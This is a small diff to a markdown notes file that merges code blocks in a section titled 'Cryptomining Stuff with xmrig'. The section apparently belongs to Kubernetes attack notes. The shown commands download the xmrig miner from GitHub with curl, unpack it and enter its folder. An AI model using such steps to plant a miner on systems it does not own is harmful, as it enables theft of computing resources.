@@ -401,11 +401,7 @@ kubectl exec -it busybox -- sh
 ## Cryptomining Stuff with xmrig
 ```
 curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
-```
-```
 tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
-```
-```
 cd xmrig-6.16.4
 ```
 ```
